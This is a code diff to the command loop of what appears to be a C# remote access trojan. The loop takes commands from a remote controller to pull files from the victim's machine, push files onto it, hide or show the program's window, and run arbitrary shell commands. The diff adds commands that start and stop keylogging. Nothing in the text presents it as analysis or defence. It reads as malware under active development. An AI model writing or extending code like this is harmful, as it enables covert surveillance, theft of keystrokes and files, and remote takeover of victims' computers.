@@ -86,22 +86,12 @@ async Task ReceiveMessageAsync(StreamReader reader)
             string? message = await reader.ReadLineAsync();
             if (string.IsNullOrEmpty(message)) continue;
             Print(message);
-            if (message.StartsWith("dload-func"))
-            {
-                await SendFileAsync(message.Replace("dload-func ", string.Empty));
-            }
-            else if (message.StartsWith("upload-func"))
-            {
-                await RecieveFileAsync(message.Replace("upload-func ", string.Empty));
-            }
-            else if (message.StartsWith("window-func-show"))
-            {
-                ShowWindow(handle, SW_SHOW);
-            }
-            else if (message.StartsWith("window-func-hide"))
-            {
-                ShowWindow(handle, SW_HIDE);
-            }
+            if (message.StartsWith("dload-func")) await SendFileAsync(message.Replace("dload-func ", string.Empty));
+            else if (message.StartsWith("upload-func")) await RecieveFileAsync(message.Replace("upload-func ", string.Empty));
+            else if (message.StartsWith("window-func-show")) ShowWindow(handle, SW_SHOW);
+            else if (message.StartsWith("window-func-hide")) ShowWindow(handle, SW_HIDE);
+            else if (message.StartsWith("keylog-func-start")) StartKeylogging();
+            else if (message.StartsWith("keylog-func-stop")) StopKeylogging(message.Replace("keylog-func-stop ", string.Empty));
             else ShellCommand(message);
         }
         catch
